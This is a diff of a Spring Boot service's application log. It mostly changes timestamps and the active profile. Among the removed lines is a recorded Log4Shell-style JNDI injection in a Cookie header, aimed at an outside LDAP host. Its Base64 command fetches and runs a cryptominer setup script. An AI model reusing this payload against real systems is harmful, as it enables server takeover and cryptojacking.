@@ -3,9 +3,9 @@ SLF4J: Found binding in [jar:file:/app/mingink-modules-system.jar!/BOOT-INF/lib/
 SLF4J: Found binding in [jar:file:/app/mingink-modules-system.jar!/BOOT-INF/lib/slf4j-reload4j-1.7.36.jar!/org/slf4j/impl/StaticLoggerBinder.class]
 SLF4J: See http://www.slf4j.org/codes.html#multiple_bindings for an explanation.
 SLF4J: Actual binding is of type [ch.qos.logback.classic.util.ContextSelectorStaticBinder]
-2024-02-23 23:18:02.361  INFO 1 --- [           main] c.a.n.client.env.SearchableProperties    : properties search order:PROPERTIES->JVM->ENV->DEFAULT_SETTING
-2024-02-23 23:18:03.012  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.impl.NacosClientAuthServiceImpl success.
-2024-02-23 23:18:03.012  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.ram.RamClientAuthServiceImpl success.
+2024-02-26 17:20:11.856  INFO 1 --- [           main] c.a.n.client.env.SearchableProperties    : properties search order:PROPERTIES->JVM->ENV->DEFAULT_SETTING
+2024-02-26 17:20:12.631  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.impl.NacosClientAuthServiceImpl success.
+2024-02-26 17:20:12.632  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.ram.RamClientAuthServiceImpl success.
 
   .   ____          _            __ _ _
  /\\ / ___'_ __ _ _(_)_ __  __ _ \ \ \ \
@@ -15,36 +15,36 @@ SLF4J: Actual binding is of type [ch.qos.logback.classic.util.ContextSelectorSta
  =========|_|==============|___/=/_/_/_/
  :: Spring Boot ::               (v2.7.13)
 
-2024-02-23 23:18:04.426  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system] & group[DEFAULT_GROUP]
-2024-02-23 23:18:04.431  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system.yml] & group[DEFAULT_GROUP]
-2024-02-23 23:18:04.435  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system-prod.yml] & group[DEFAULT_GROUP]
-2024-02-23 23:18:04.436  INFO 1 --- [           main] b.c.PropertySourceBootstrapConfiguration : Located property source: [BootstrapPropertySource {name='bootstrapProperties-mingink-system-prod.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-system.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-system,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-redis.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-mysql.yml,DEFAULT_GROUP'}]
-2024-02-23 23:18:04.456  INFO 1 --- [           main] c.m.system.MingInkSystemApplication      : The following 1 profile is active: "prod"
-2024-02-23 23:18:06.031  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Multiple Spring Data modules found, entering strict repository configuration mode
-2024-02-23 23:18:06.038  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data Redis repositories in DEFAULT mode.
-2024-02-23 23:18:06.081  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 10 ms. Found 0 Redis repository interfaces.
-2024-02-23 23:18:06.495  INFO 1 --- [           main] o.s.cloud.context.scope.GenericScope     : BeanFactory id=de026444-1dc0-38e3-8981-37ca2e9fc3f2
-2024-02-23 23:18:07.255  INFO 1 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8082 (http)
-2024-02-23 23:18:07.270  INFO 1 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
-2024-02-23 23:18:07.270  INFO 1 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.76]
-2024-02-23 23:18:07.370  INFO 1 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
-2024-02-23 23:18:07.371  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 2865 ms
+2024-02-26 17:20:14.502  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system] & group[DEFAULT_GROUP]
+2024-02-26 17:20:14.509  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system.yml] & group[DEFAULT_GROUP]
+2024-02-26 17:20:14.514  WARN 1 --- [           main] c.a.c.n.c.NacosPropertySourceBuilder     : Ignore the empty nacos configuration and get it based on dataId[mingink-system-dev.yml] & group[DEFAULT_GROUP]
+2024-02-26 17:20:14.516  INFO 1 --- [           main] b.c.PropertySourceBootstrapConfiguration : Located property source: [BootstrapPropertySource {name='bootstrapProperties-mingink-system-dev.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-system.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-system,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-redis.yml,DEFAULT_GROUP'}, BootstrapPropertySource {name='bootstrapProperties-mingink-mysql.yml,DEFAULT_GROUP'}]
+2024-02-26 17:20:14.545  INFO 1 --- [           main] c.m.system.MingInkSystemApplication      : The following 1 profile is active: "dev"
+2024-02-26 17:20:16.769  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Multiple Spring Data modules found, entering strict repository configuration mode
+2024-02-26 17:20:16.776  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Bootstrapping Spring Data Redis repositories in DEFAULT mode.
+2024-02-26 17:20:16.824  INFO 1 --- [           main] .s.d.r.c.RepositoryConfigurationDelegate : Finished Spring Data repository scanning in 14 ms. Found 0 Redis repository interfaces.
+2024-02-26 17:20:17.518  INFO 1 --- [           main] o.s.cloud.context.scope.GenericScope     : BeanFactory id=de026444-1dc0-38e3-8981-37ca2e9fc3f2
+2024-02-26 17:20:18.790  INFO 1 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat initialized with port(s): 8082 (http)
+2024-02-26 17:20:18.812  INFO 1 --- [           main] o.apache.catalina.core.StandardService   : Starting service [Tomcat]
+2024-02-26 17:20:18.813  INFO 1 --- [           main] org.apache.catalina.core.StandardEngine  : Starting Servlet engine: [Apache Tomcat/9.0.76]
+2024-02-26 17:20:19.002  INFO 1 --- [           main] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring embedded WebApplicationContext
+2024-02-26 17:20:19.002  INFO 1 --- [           main] w.s.c.ServletWebServerApplicationContext : Root WebApplicationContext: initialization completed in 4387 ms
  _ _   |_  _ _|_. ___ _ |    _ 
 | | |\/|_)(_| | |_\  |_)||_|_\ 
      /               |         
                         3.4.2 
-2024-02-23 23:18:07.943  WARN 1 --- [           main] c.b.m.core.metadata.TableInfoHelper      : Can not find table primary key in Class: "com.mingink.system.domain.UserRole".
-2024-02-23 23:18:10.121  WARN 1 --- [           main] iguration$LoadBalancerCaffeineWarnLogger : Spring Cloud LoadBalancer is currently working with the default cache. While this cache implementation is useful for development and tests, it's recommended to use Caffeine cache in production.You can switch to using Caffeine cache, by adding it and org.springframework.cache.caffeine.CaffeineCacheManager to the classpath.
-2024-02-23 23:18:10.219  INFO 1 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8082 (http) with context path ''
-2024-02-23 23:18:10.233  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.impl.NacosClientAuthServiceImpl success.
-2024-02-23 23:18:10.233  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.ram.RamClientAuthServiceImpl success.
-2024-02-23 23:18:10.482  INFO 1 --- [           main] c.a.c.n.registry.NacosServiceRegistry    : nacos registry, DEFAULT_GROUP mingink-system 172.19.0.3:8082 register finished
-2024-02-23 23:18:10.920  INFO 1 --- [           main] c.m.system.MingInkSystemApplication      : Started MingInkSystemApplication in 9.373 seconds (JVM running for 10.035)
-2024-02-23 23:18:10.939  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system-prod.yml, group=DEFAULT_GROUP
-2024-02-23 23:18:10.940  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system.yml, group=DEFAULT_GROUP
-2024-02-23 23:18:10.940  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-redis.yml, group=DEFAULT_GROUP
-2024-02-23 23:18:10.941  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-mysql.yml, group=DEFAULT_GROUP
-2024-02-23 23:18:10.941  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system, group=DEFAULT_GROUP
+2024-02-26 17:20:19.996  WARN 1 --- [           main] c.b.m.core.metadata.TableInfoHelper      : Can not find table primary key in Class: "com.mingink.system.domain.entity.UserRole".
+2024-02-26 17:20:22.850  WARN 1 --- [           main] iguration$LoadBalancerCaffeineWarnLogger : Spring Cloud LoadBalancer is currently working with the default cache. While this cache implementation is useful for development and tests, it's recommended to use Caffeine cache in production.You can switch to using Caffeine cache, by adding it and org.springframework.cache.caffeine.CaffeineCacheManager to the classpath.
+2024-02-26 17:20:22.989  INFO 1 --- [           main] o.s.b.w.embedded.tomcat.TomcatWebServer  : Tomcat started on port(s): 8082 (http) with context path ''
+2024-02-26 17:20:23.006  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.impl.NacosClientAuthServiceImpl success.
+2024-02-26 17:20:23.006  INFO 1 --- [           main] c.a.n.p.a.s.c.ClientAuthPluginManager    : [ClientAuthPluginManager] Load ClientAuthService com.alibaba.nacos.client.auth.ram.RamClientAuthServiceImpl success.
+2024-02-26 17:20:23.251  INFO 1 --- [           main] c.a.c.n.registry.NacosServiceRegistry    : nacos registry, DEFAULT_GROUP mingink-system 172.19.0.3:8082 register finished
+2024-02-26 17:20:23.716  INFO 1 --- [           main] c.m.system.MingInkSystemApplication      : Started MingInkSystemApplication in 12.845 seconds (JVM running for 13.855)
+2024-02-26 17:20:23.731  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system.yml, group=DEFAULT_GROUP
+2024-02-26 17:20:23.732  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-redis.yml, group=DEFAULT_GROUP
+2024-02-26 17:20:23.733  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-mysql.yml, group=DEFAULT_GROUP
+2024-02-26 17:20:23.733  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system, group=DEFAULT_GROUP
+2024-02-26 17:20:23.733  INFO 1 --- [           main] c.a.c.n.refresh.NacosContextRefresher    : [Nacos Config] Listening config: dataId=mingink-system-dev.yml, group=DEFAULT_GROUP
 (♥◠‿◠)ﾉﾞ  MingInk-System系统模块启动成功   ლ(´ڡ`ლ)ﾞ  
   __  __   _                   ___           _    
  |  \/  | (_)  _ __     __ _  |_ _|  _ __   | | __
@@ -52,47 +52,13 @@ SLF4J: Actual binding is of type [ch.qos.logback.classic.util.ContextSelectorSta
  | |  | | | | | | | | | (_| |  | |  | | | | |   < 
  |_|  |_| |_| |_| |_|  \__, | |___| |_| |_| |_|\_\
                        |___/                      
-2024-02-23 23:25:04.390  INFO 1 --- [nio-8082-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
-2024-02-23 23:25:04.391  INFO 1 --- [nio-8082-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
-2024-02-23 23:25:04.392  INFO 1 --- [nio-8082-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
-2024-02-23 23:25:04.548  INFO 1 --- [nio-8082-exec-1] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Starting...
-2024-02-23 23:25:04.842  INFO 1 --- [nio-8082-exec-1] com.zaxxer.hikari.HikariDataSource       : HikariPool-1 - Start completed.
-2024-02-24 12:39:04.989  INFO 1 --- [io-8082-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
+2024-02-26 21:02:09.651  INFO 1 --- [nio-8082-exec-1] o.a.c.c.C.[Tomcat].[localhost].[/]       : Initializing Spring DispatcherServlet 'dispatcherServlet'
+2024-02-26 21:02:09.651  INFO 1 --- [nio-8082-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
+2024-02-26 21:02:09.653  INFO 1 --- [nio-8082-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 2 ms
+2024-02-26 21:40:40.992  INFO 1 --- [io-8082-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
  Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
 
 java.lang.IllegalArgumentException: Invalid character found in method name [0x030x000x00/*0xe00x000x000x000x000x00Cookie: ]. HTTP method names must be tokens
-	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at java.base/java.lang.Thread.run(Thread.java:831) ~[na:na]
-
-2024-02-24 16:53:05.747  INFO 1 --- [io-8082-exec-10] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
- Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
-
-java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x000xee0x010x000x000xea0x030x030xd90x1c0xb60x97e:0xcbl0x02[0x9b0x1d0xef0x04B0xff?0x980x960xb30x880xc8jF0xf70xe70xa60xc1s0xd6)0x8a ]. HTTP method names must be tokens
-	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:52) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) ~[tomcat-embed-core-9.0.76.jar!/:na]
-	at java.base/java.lang.Thread.run(Thread.java:831) ~[na:na]
-
-2024-02-25 01:51:57.980  INFO 1 --- [nio-8082-exec-1] o.apache.tomcat.util.http.parser.Cookie  : A cookie header was received [t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/a2lsbGFsbCAtOSBwYXJhaXNvLng4Njsga2lsbGFsbCAtOSB4bXJpZzsgY3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')] that contained an invalid cookie. That cookie will be ignored.
- Note: further occurrences of this error will be logged at DEBUG level.
-2024-02-25 09:09:33.281  INFO 1 --- [nio-8082-exec-8] o.apache.coyote.http11.Http11Processor   : Error parsing HTTP request header
- Note: further occurrences of HTTP request parsing errors will be logged at DEBUG level.
-
-java.lang.IllegalArgumentException: Invalid character found in method name [0x160x030x010x00u0x010x000x00q0x030x030x1e60x87NtZ0xe80xd9n0xba\\0xe10x0f0x000xce0xe8Q0xf0[0xeb0xd9Ts0xe3}'0xd1>0x0d0xecj0x000x000x1a0xc0/0xc0+0xc00x110xc00x070xc00x130xc00x090xc00x140xc00x0a0x000x050x00/0x0050xc00x120x000x0a0x010x000x00.0x000x050x000x050x010x000x000x000x000x000x0a0x000x080x000x060x000x170x000x180x000x190x000x0b0x000x020x010x000x000x0d0x000x0a0x000x080x040x010x040x030x020x010x020x030xff0x010x000x010x00...]. HTTP method names must be tokens
 	at org.apache.coyote.http11.Http11InputBuffer.parseRequestLine(Http11InputBuffer.java:407) ~[tomcat-embed-core-9.0.76.jar!/:na]
 	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:263) ~[tomcat-embed-core-9.0.76.jar!/:na]
 	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) ~[tomcat-embed-core-9.0.76.jar!/:na]
